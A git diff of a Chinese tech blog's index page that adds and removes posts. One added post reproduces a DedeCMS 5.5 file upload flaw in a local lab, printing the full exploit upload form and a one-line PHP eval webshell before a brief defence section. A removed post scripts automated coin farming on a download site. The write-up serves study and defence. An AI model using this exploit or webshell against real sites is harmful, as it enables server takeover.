@@ -40,7 +40,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
@@ -72,6 +72,359 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-windows-php-file-upload-1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/10/28/windows-php-file-upload-1/" class="article-date">
+  <time datetime="2018-10-28T14:11:37.000Z" itemprop="datePublished">2018-10-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/28/windows-php-file-upload-1/">windows-php-file-uoload_1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/10/28/windows-php-file-upload-1/" data-id="cjqenkupj000x9wx7f87k64m7" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-dede-select-soft-post-md" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/10/22/dede-select-soft-post-md/" class="article-date">
+  <time datetime="2018-10-22T08:36:32.000Z" itemprop="datePublished">2018-10-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/22/dede-select-soft-post-md/">dedecms5.5文件上传漏洞复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>最近的从防火墙检测流量发现一大波webshell上传威胁告警，指向select_soft_post.php这个文件。查了一下发现是dedecms的一个任意文件上传漏洞，发生在5.5跟5.5final版本。</p>
+<h2 id="0x01-准备环境"><a href="#0x01-准备环境" class="headerlink" title="0x01 准备环境"></a>0x01 准备环境</h2><ul>
+<li>目前的环境<br>之前一直习惯用xampp，虽然xampp比较稳定，但不支持多版本，更适合做开发及搭建版本稳定的学习环境。做漏洞复现，我们需要PHP运行环境的各种版本，相比而言，phpstudy才是更加适合目前操作的机器。</li>
+<li>php dedecms5.5系统</li>
+<li>准备好的exp</li>
+</ul>
+<h2 id="0x02-动手搭建"><a href="#0x02-动手搭建" class="headerlink" title="0x02 动手搭建"></a>0x02 动手搭建</h2><p>下载phpstudy，解压安装到C盘根路径下，并开启，将dedecms5.5放到网站根路径</p>
+<pre><code>C:\phpStudy\PHPTutorial\WWW
+</code></pre><p>解压获取的dedecmsv55系统放到该路径下，访问install,逐步完成安全，可见如下界面</p>
+<img src="/2018/10/22/dede-select-soft-post-md/dedecms.png" alt="dedecms.png" title="">
+<p>至此，环境我们就准备好了，开始复现</p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>首先分析一下漏洞原因<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if(!isset($cfg_basedir))</div><div class="line">&#123;</div><div class="line">	include_once(dirname(__FILE__).&apos;/config.php&apos;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><br>变量$cfg_basedir没有正确的初始化，如果设置了global_register=on，我们可以通过覆盖变量的方式，饶过身份认证和系统变量初始化文件。</p>
+<p>因此，这个漏洞的触发条件有两个，因为需要启动global_register,因此php的版本需要为5.2或者5.3，高版本的已经禁用了这个功能，这也是我们选择使用phpstudy来复现这个漏洞的原因。</p>
+<ul>
+<li>dedecms5.5版本</li>
+<li>php环境开启了global_register</li>
+</ul>
+<p>接下来我们可以通告大佬写的一个表单上传，表单form对应的链接需要修改对应站点域名，然后来上传webshell文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Dedecms v55 RCE Exploit Codz By flyh4t&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body style=&quot;FONT-SIZE: 9pt&quot;&gt;---------- Dedecms v55 RCE Exploit Codz By flyh4t---------- &lt;br /&gt;&lt;br /&gt;</div><div class="line">&lt;form action=http://localhost:8888/dedecms/include/dialog/select_soft_post.php method=&apos;POST&apos; enctype=&quot;multipart/form-data&quot; name=&apos;myform&apos;&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;activepath&apos; value=&apos;/data/cache/&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_basedir&apos; value=&apos;../../&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_imgtype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_not_allowall&apos; value=&apos;txt&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_softtype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;cfg_mediatype&apos; value=&apos;php&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;f&apos; value=&apos;form1.enclosure&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;job&apos; value=&apos;upload&apos; /&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;newname&apos; value=&apos;fly.php&apos; /&gt;</div><div class="line">Select U Shell &lt;input type=&apos;file&apos; name=&apos;uploadfile&apos; size=&apos;25&apos; /&gt;</div><div class="line">&lt;input type=&apos;submit&apos; name=&apos;sb1&apos; value=&apos;确定&apos; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;br /&gt;It&apos;s just a exp for the bug of Dedecms V55...&lt;br /&gt;</div><div class="line">Need register_globals = on...&lt;br /&gt;Fun the game,get a webshell at /data/cache/fly.php...&lt;br /&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>对应的webshell,一句话后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">eval($_POST[&quot;a&quot;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>使用菜刀访问上传的webshell。</p>
+<img src="/2018/10/22/dede-select-soft-post-md/result.png" alt="result.png" title="">
+<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>从漏洞产生条件上来看，可以关闭global_register功能，当然其他的方法也很多，比如禁止使用select_soft_post页面 </p>
+<h2 id="0x05-更多的利用"><a href="#0x05-更多的利用" class="headerlink" title="0x05 更多的利用"></a>0x05 更多的利用</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/10/22/dede-select-soft-post-md/" data-id="cjqenkun500099wx7mpfrfzvt" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-beginners‘python" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/21/beginners‘python/" class="article-date">
+  <time datetime="2018-05-21T15:36:24.000Z" itemprop="datePublished">2018-05-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/21/beginners‘python/">python之解放生产力</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <h3 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h3><p>廖雪峰的教程，有一个很好的地方，顺着教程能够看清Python的全部面貌。</p>
+<p>然而程序呢，并不是一个等所有知识点全学完了才可以动手写的事情。之前有过其他语言编程经验的人，往往在看过一遍语法的基础上就开始编程，只是简单的用法就能体现出”人生苦短，我用Python“的简洁高效，即使代码上依旧带有其他语言使用经验的编程风格。</p>
+<p>虽如此，进一步的学习，还是有必要的。</p>
+<pre><code>人生苦短 我用Python
+</code></pre><p>那么看看廖雪峰的教程提到了那些具有科技革命的高级特性。</p>
+<h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>什么是切片呢，就是我们可以通过正负值的下标已经跳跃长度来截取变量。</p>
+<p>逆置一个数组，曾经的写法可能是for循环中依此赋值，这个时候我们还要小心的处理下标，但是有了切片：<br>b = a[::-1]</p>
+<p>注意一个要点，就是切片并不在原来数据上操作，</p>
+<h3 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h3><p>主要用于for循环等批量生成列表的地方。<br>我们最熟悉的写法可能是</p>
+<pre><code>for i in range(100):
+    a.append(i)
+</code></pre><p>使用列表生成式</p>
+<pre><code>a = [i for i in range(100)]
+</code></pre><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>什么是迭代器：就是边循环便计算的机制。<br>生成器解决了一个问题，可以大批量生成的对象，随用随取，省了空间。<br>注意与列表生成式子的区别，</p>
+<pre><code># 列表生成式
+a = [i for i in range(10)]
+# 生成器
+b = (i for i in range(10))
+</code></pre><p>上面的写法不需要初始化，可以直接使用next(g)来获取首位及下一位元素，更优雅的方式是使用for循环。</p>
+<p>另一种更优雅的用法 yield </p>
+<h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p>迭代强调了一个抽象度更高的for-in循环模式。list，tuple等都可以使用，然后如果像同步使用下标数字来引用元素的话，我们可以使用enumerate函数</p>
+<pre><code>for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]):
+    print(i, value)
+</code></pre><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>写程序的时候经常遇到的一个错误：<br>object is not iterable。可以使用for-in情况的对象必须是可迭代的。</p>
+<p>主要有两类：</p>
+<ul>
+<li><p>集合数据类型，如list、tuple、dict、set、str等；</p>
+</li>
+<li><p>generator，包括生成器和带yield的generator function。</p>
+</li>
+</ul>
+<p>那么，问题来了:如何判断是否对象可迭代？</p>
+<pre><code>from collections import Iterable
+isinstance([], Iterable)
+</code></pre><p>然而还有一个问题，可迭代与迭代器并不是一回事情。</p>
+<p>Python的Iterator对象表示的是一个数据流，Iterator对象可以被next()函数调用并不断返回下一个数据，直到没有数据时抛出StopIteration错误。可以把这个数据流看做是一个有序序列，但我们却不能提前知道序列的长度，只能不断通过next()函数实现按需计算下一个数据，所以Iterator的计算是惰性的，只有在需要返回下一个数据时它才会计算。</p>
+<h3 id="Pyhton的高级函数编程"><a href="#Pyhton的高级函数编程" class="headerlink" title="Pyhton的高级函数编程"></a>Pyhton的高级函数编程</h3><p>记得最早写Javascript的时候，接触到函数式编程，每种语言都有自己的一等公民，熟练使用一类公民才算得上是接触到语言的核心风格。</p>
+<h4 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h4><ul>
+<li>map/reduce<br>惰性处理</li>
+<li>filter 结合迭代器的无限数据流惰性运算，求素数使用的filter简直不能更完美。</li>
+<li><p>sorted<br>可以指定比较的键函数<br>上面的函数从更加抽象，更加深层次的程度上优化了习惯的编程思维。总体来说，在需要的场合，通过对上面这些函数的使用能够替换原来臃肿的处理流程，并且逻辑上更加清晰，</p>
+</li>
+<li><p>返回函数</p>
+</li>
+</ul>
+<p>既然是函数式编程，也就是说函数能够作为参数来使用，这边有一个很重要的概念式闭包。</p>
+<ul>
+<li><p>匿名函数 lambda</p>
+</li>
+<li><p>装饰器</p>
+</li>
+</ul>
+<p>在函数之前或者之后执行某个操作，可以用来控制权限，写日志，绑定url和函数</p>
+<ul>
+<li>偏函数</li>
+</ul>
+<p>优化函数的参数</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/05/21/beginners‘python/" data-id="cjqenkunb000a9wx7dlslf5k6" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-CodeAudit" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/12/CodeAudit/" class="article-date">
+  <time datetime="2018-05-12T12:50:02.000Z" itemprop="datePublished">2018-05-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/12/CodeAudit/">CodeAudit</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <p><img src="https://upload-images.jianshu.io/upload_images/2303859-2c0c209d7d76a685.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PHP代码审计学习笔记"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/05/12/CodeAudit/" data-id="cjqenkumo00039wx7maw90ucy" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-Web-Scanner" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/12/Web-Scanner/" class="article-date">
+  <time datetime="2018-05-12T12:40:39.000Z" itemprop="datePublished">2018-05-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/12/Web-Scanner/">Web扫描器</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <p>《白帽子讲web扫描》<br>刚好也是最近在忙的毕业设计，多考虑一点，多写一点。<br>扫描器扫的是什么？是怎么进行的？<br>获取扫描目标，也就是带有参数的各种链接。<br>扫描目标从哪里来，信息收集，指纹识别，具体的指纹也并不是从空而来，而是一个的规则，能够使用机器识别的方式么？很难，缺乏统一的数据集。<br>目前主要是爬虫技术，然后是漏洞审计，根据规则来判定漏洞存在与否。<br>一款web漏洞扫描器应该具有那些功能：</p>
+<ul>
+<li>web爬虫<br>想办法爬取全部链接，不考虑这个问题，尽快设计url处理的模块及方式。<br>重点在哪：<br>url相似，包含、重复等问题</li>
+<li></li>
+<li>扫描器具体的数据结构，软件架构、各功能的实现<ul>
+<li>端口扫描与破解</li>
+<li>子域名收集</li>
+<li>敏感信息手机、指纹识别</li>
+<li>通用漏洞审计（sql注入，xss，命令执行，文件包含，敏感文件泄漏）</li>
+<li>nday/0day漏洞审计（discuz dedecms heartbleed php 远程ddos）<br><img src="https://upload-images.jianshu.io/upload_images/2303859-ecb8a2ee444a5764.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="WebScanner.jpg"></li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/05/12/Web-Scanner/" data-id="cjqenkumr00049wx78z5b4gx5" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
+    <article id="post-python-in-practice" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/16/python-in-practice/" class="article-date">
+  <time datetime="2018-04-16T15:40:23.000Z" itemprop="datePublished">2018-04-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/16/python-in-practice/">关于python的一点实践</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <p>最开始写python，还是14年的时候开始。</p>
+<p>很长一段时间里，都是写十几句的脚本。写一行代码，要百度三五次。一来是写的少，另一来是基础也就那样。不懂还不知道学习。<br>那个时候还在python challenge装逼。</p>
+<p>最近在还是在写脚本，也没有写很多的东西，三五个文件，几百行代码。想把代码组织的清晰，就要有原则。</p>
+<p>总结几条实践：</p>
+<ul>
+<li>命名是一个大问题，自己写的时候已经很注意了，然而还是有很多脸红的地方。<ul>
+<li>函数使用小写 下划线分割</li>
+<li>类名使用首字母大写的驼峰方式</li>
+<li>文件名也要使用描述性的词汇，不要与使用的类库同名</li>
+<li>注意使用空行 类后两行分割 </li>
+<li>默认参数中间的空格</li>
+</ul>
+</li>
+<li>关于编程风格这一点，还是要多多琢磨pycharm的提示。消除提示的过程就是一个学习的过程。</li>
+<li>import的机制还需要进一步加强理解</li>
+<li>马上把廖雪峰的python3教程看一遍，熟悉一些用法，来改进不优雅的地方。</li>
+</ul>
+<p>既然在做着这个事情，就奋力打铁啊。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/04/16/python-in-practice/" data-id="cjqenkuox000q9wx7cfd46t30" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+ 
+
+
+  
     <article id="post-ml-cluster-algorithm" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/04/10/ml-cluster-algorithm/" class="article-date">
@@ -101,7 +454,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/10/ml-cluster-algorithm/" data-id="cjnynvpem000jyax70qwxsbvr" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/04/10/ml-cluster-algorithm/" data-id="cjqenkupe000s9wx7ycfyz53b" class="article-share-link">Share</a>
       
       
       
@@ -255,7 +608,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/25/hadoop-install-intro/" data-id="cjnynvpe4000byax7so8gdn22" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/25/hadoop-install-intro/" data-id="cjqenkuns000f9wx7qlnb29bp" class="article-share-link">Share</a>
       
       
       
@@ -296,7 +649,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/22/spider-intro/" data-id="cjnynvpet000pyax70dflmwh9" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/22/spider-intro/" data-id="cjqenkupn000y9wx7p0hs1tn3" class="article-share-link">Share</a>
       
       
       
@@ -427,476 +780,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/13/Web-Test/" data-id="cjnynvpdt0006yax71e5xcg82" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-getcoin" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/03/07/getcoin/" class="article-date">
-  <time datetime="2018-03-07T07:00:10.000Z" itemprop="datePublished">2018-03-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/07/getcoin/">python编程之编写获取金币脚本</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <p>最近看到个特别全面源码分享网站，刚好有个项目是一直想做但是没有头绪的，就想下载学习一下。注册账号后，发现还需要若干金币。后来发现可以通过每隔一定时间发心情状态来获得金币，就打算写一个自动发心情状态的python脚本来收割金币。</p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>使用burp抓取一下提交的包，如下图所示：<br><img src="http://upload-images.jianshu.io/upload_images/2303859-1d56ed3fa41ffe3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="心情状态包.png"></p>
-<p>因此我们的目的是写一个自动提交心情的python脚本，提交包中需要包含必要的cookie信息，隐藏的radom字符串，心情文本内容，和文件，经测试发现文件可为空。表单中只包含前两项就可以成功增加金币，这就更加省事了。<br>文末附有完整python代码，接下来我们看一下是怎么一步步写出来的。</p>
-<h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>首先先写读取页面的功能！这个之前也写过很多，都是搜索出一段代码来直接使用。然而这次找了几段代码代码应为python及库的版本问题都不太好调试。<br>就直接看requests库官方文档，官方文档才是最好的资料。<br>版本1代码</p>
-<pre><code>#coding:utf-8  
-import requests
-url_home = &quot;http://www.home.com/&quot;
-r = requests.get(url_home)
-print(r.text)
-</code></pre><p>执行结果如下图所示，我们能够获得网站<br><img src="http://upload-images.jianshu.io/upload_images/2303859-4cc7b556b2104a15.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<p>此时获得的页面是未曾登陆的无法发表心情状态。</p>
-<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>接下来我们先将cookie信息硬编码到代码中，来测试一下。<br>cookie信息可如下图所示从浏览器中获取.<br><img src="http://upload-images.jianshu.io/upload_images/2303859-3cc24818e9428260.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="cookie.png"></p>
-<p>版本2代码：</p>
-<pre><code>#coding:utf-8  
-import requests
-cookies = dict(zdmid=&quot;93EB84AE485E7B7E365C4F87691F8A9D&quot;)
-url_home = &quot;http://www.home.com/&quot;
-r = requests.get(url_home，cookies=cookies)
-print(r.text)
-</code></pre><p>此时返回页面正常登陆<img src="http://upload-images.jianshu.io/upload_images/2303859-b9001301d8372fc1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="home.png"></p>
-<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>接下来我们提取需要提交表单的隐藏input随机字符串，同时选择当前首页的其他人的心情状态作为我们的文本内容。<br>解析html，当然是神库beautifulSoup4了，别无他想。分析需要提取的值在html页面的具体位置，查看官方文档选择合适的api方法，然后编写代码实现。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-be8fb274e3590a41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="random.png"><br>同样方法获得心情内容所在位置，进一步完善代码。<br>版本3代码</p>
-<pre><code>#coding:utf-8  
-import requests
-from bs4 import BeautifulSoup
-
-cookies = dict(zdmid=&quot;451178ECCF2145D24F94DE0A1DF7D658&quot;)
-url_home = &quot;http://www.home.com/&quot;
-r = requests.get(url_home, cookies=cookies)
-soup = BeautifulSoup(r.text, &apos;html.parser&apos;)
-random = soup.form.input.attrs[&quot;value&quot;] 
-content = soup.select_one(&quot;.content&quot;).contents[0]
-
-print(random)
-print(content)
-</code></pre><p><img src="http://upload-images.jianshu.io/upload_images/2303859-e9edf16b638cae94.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="提取内容.png"></p>
-<h3 id="第四步骤"><a href="#第四步骤" class="headerlink" title="第四步骤"></a>第四步骤</h3><p>接下来我们来实现提交心情状态功能。<br>只需要将上一步骤提取的内容构造post提交就可以了。</p>
-<p>版本4代码</p>
-<pre><code>#coding:utf-8  
-import requests
-from bs4 import BeautifulSoup
-
-cookies = dict(zdmid=&quot;451178ECCF2145D24F94DE0A1DF7D658&quot;)
-url_home = &quot;http://www.home.com/&quot;
-r = requests.get(url_home, cookies=cookies)
-soup = BeautifulSoup(r.text, &apos;html.parser&apos;)
-random = soup.form.input.attrs[&quot;value&quot;] 
-content = soup.select_one(&quot;.content&quot;).contents[0]
-
-mood_create = &apos;http://www.mood/create.htm&apos;
-payload = {&apos;radom&apos;: radom, &apos;content&apos;: content}
-requests.post(mood_create, cookies=cookies, data=payload)
-</code></pre><h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>上面的代码因为cookie的值是硬编码在脚本中，这样一旦session过期，后面将会跳转到未登录装填。这就需要我们重新去更新cookie对应的值，那么有没有方法可以解决这个问题呢？<br>当然是有的。看一下requests提供的session解决方案，如下图<br><img src="http://upload-images.jianshu.io/upload_images/2303859-ce0febe5ac7cd30d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="session.png"></p>
-<p>因此可以使用session来改造代码，requests中的session将会自动保存相关的cookie信息，如此每次运行就可以自动使用账号及密码登陆。<br>版本5代码</p>
-<pre><code>#coding:utf-8  
-import requests
-from bs4 import BeautifulSoup
-
-s = requests.Session()
-url_home = &quot;http://www.home.com/&quot;
-s.get(url_home)
-
-url_login = &quot;http://www.login.htm&quot;
-data_login = {&apos;account&apos;:&apos;username&apos;,&apos;password&apos;:&apos;passwd&apos;,&apos;rememberme&apos;:&apos;on&apos;}
-text = s.post(url_login,data=data_login)
-
-r = s.get(url_home)
-soup = BeautifulSoup(r.text, &apos;html.parser&apos;)
-random = soup.form.input.attrs[&quot;value&quot;] 
-content = soup.select_one(&quot;.content&quot;).contents[0]
-
-mood_create = &apos;http://www.moodcreate.htm&apos;
-payload = {&apos;radom&apos;: radom, &apos;content&apos;: content}
-s.post(mood_create, cookies=cookies, data=payload)
-</code></pre><h3 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h3><p>上面的步骤完成后，我们可以执行一次自动提交心情状态的代码。我们想要做的每隔一定的时间间隔提交一条状态。因此还要添加上一个定时器，来自动执行这个过程。<br>最终完整代码如下，justForFun。</p>
-<pre><code>#coding:utf-8
-import threading
-import requests
-import random
-from bs4 import BeautifulSoup
-url_login = &quot;http://www.user/login.htm&quot;
-url_home = &quot;http://www.home.com/&quot;
-mood_create = &quot;http://www.mood/create.htm&quot;
-
-s = requests.Session()
-
-def create():
-    global timer
-    global s
-    s.get(url_home)
-    data_login = {&apos;account&apos;:&apos;username&apos;,&apos;password&apos;:‘passwd&apos;,&apos;rememberme&apos;:&apos;on&apos;}
-    text = s.post(url_login,data=data_login)
-    res = s.get(url_home)
-    soup = BeautifulSoup(r.text, &apos;html.parser&apos;)
-    random = soup.form.input.attrs[&quot;value&quot;] 
-    content = soup.select_one(&quot;.content&quot;).contents[0]
-    payload = {&apos;radom&apos;: random, &apos;content&apos;: content}
-    s.post(mood_create, cookies=cookies, data=payload)
-
-    timer = threading.Timer(5*60*60, create) 
-    timer.start()
-
-timer = threading.Timer(1, create)    
-timer.start()
-</code></pre>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/07/getcoin/" data-id="cjnynvpdz0008yax7wrew4hru" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python-技术/">python 技术</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-IPC-EXP" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/03/07/IPC-EXP/" class="article-date">
-  <time datetime="2018-03-07T06:57:39.000Z" itemprop="datePublished">2018-03-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/07/IPC-EXP/">小白入门之IPC实验</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <h1 id="0x00-漏洞说明"><a href="#0x00-漏洞说明" class="headerlink" title="0x00 漏洞说明"></a>0x00 漏洞说明</h1><p>IPC$ (Internet Process Connection) 是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行数据交换，从而实现对远程计算机的访问。IPC$是NT/2000及之后OS的一项新功能。一些别有用心者可以利用黑客工具软件对主机进行IPC$漏洞探测。如果用户设置的口令较弱而被破解，那么通过建立IPC＄连接的以下命令，攻击者就可以轻易地进入到系统中进行任意操作。</p>
-<h1 id="0x01-工具准备"><a href="#0x01-工具准备" class="headerlink" title="0x01 工具准备"></a>0x01 工具准备</h1><p>操作系统：</p>
-<p>攻击机器 任意windows系统 本次实验中我所使用的是win10 专业版</p>
-<p>目标靶机 windows xp 或者 windows server 2003 可以虚拟机，因为最近在玩webug，就直接使用windows server 2003了</p>
-<p>实验工具 链接：<a href="http://pan.baidu.com/s/1nuFbekh" target="_blank" rel="external">http://pan.baidu.com/s/1nuFbekh</a> 密码：lw0n</p>
